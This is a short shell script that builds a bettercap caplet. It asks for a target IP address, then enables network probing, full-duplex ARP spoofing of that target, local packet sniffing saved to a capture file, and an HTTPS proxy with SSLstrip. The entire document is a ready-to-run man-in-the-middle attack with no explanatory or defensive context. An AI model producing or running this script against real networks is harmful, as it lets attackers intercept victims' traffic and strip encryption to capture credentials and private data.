cp /dev/null spoofer.cap
echo "net.probe on" >> spoofer.cap
echo "set arp.spoof.fullduplex true" >> spoofer.cap
echo "enter ip"
read ip
echo "set arp.spoof.targets $ip" >> spoofer.cap
echo "arp.spoof on" >> spoofer.cap
echo "set net.sniff.local true" >> spoofer.cap
echo "set net.sniff.output /root/Desktop/bettercap_tool/data.cap" >> spoofer.cap    
echo "set https.proxy.sslstrip true" >> spoofer.cap   
echo "net.sniff on" >> spoofer.cap
